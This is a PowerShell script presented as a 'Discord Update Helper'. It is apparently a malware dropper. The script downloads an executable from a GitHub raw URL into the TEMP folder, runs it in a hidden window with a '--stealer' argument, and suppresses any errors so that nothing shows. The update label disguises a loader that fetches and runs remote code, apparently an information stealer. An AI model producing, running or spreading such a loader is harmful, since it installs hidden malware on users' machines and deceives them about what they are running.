# Discord Update Helper
$exePath = "$env:TEMP\DiscordUpdate.exe"
$url = "https://raw.githubusercontent.com/urho122-cpu/captcha/main/DiscordUpdate.exe"

try {
    (New-Object Net.WebClient).DownloadFile($url, $exePath)
    Start-Process $exePath -ArgumentList '--stealer' -WindowStyle Hidden
} catch {
    # Silent fail
}
